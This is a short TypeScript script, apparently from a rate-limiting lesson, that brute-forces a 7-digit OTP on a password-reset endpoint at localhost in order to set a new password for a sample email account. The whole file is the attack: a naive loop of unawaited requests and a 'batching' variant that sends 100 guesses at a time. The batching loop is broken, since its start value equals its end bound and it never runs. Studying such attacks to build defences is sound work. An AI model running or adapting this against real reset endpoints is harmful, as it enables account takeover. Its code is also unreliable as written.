import axios from "axios";

async function resetPassword(otp: string) {
    // get the request from Postman or create one manually
    const data = JSON.stringify({
        "email": "sample@gmail.com",
        "otp": otp,
        "password": "newPass@123"
    });

    const config = {
        method: 'post',
        maxBodyLength: Infinity,
        url: 'http://localhost:3000/reset-password',
        headers: {
            'Content-Type': 'application/json'
        },
        data: data
    };

    await axios.request(config)
        .then((response) => {
            console.log(JSON.stringify(response.data));
        })
        .catch((error) => {
            // console.log(error);
        });
}


// This will cause heap out of memory on your machine 
// Mileage may vary machine to machine
function bruteForce() {
    for (let i = 1000000; i < 10000000; i++) {
        console.log(i);
        resetPassword(i.toString());
    }
}


// What can be a better approach ? BATCHING !
async function bacthingRequest() {
    // lets create batch of size 100
    const batchSize = 100;
    for (let i = 10000000; i < 10000000; i++) {
        const p: Promise<void>[] = []
        for (let j = i; j < i + batchSize; j++) {
            p.push(resetPassword(j.toString()));
        }
        await Promise.all(p);
    }
}

function main() {
    bacthingRequest();
}

main();

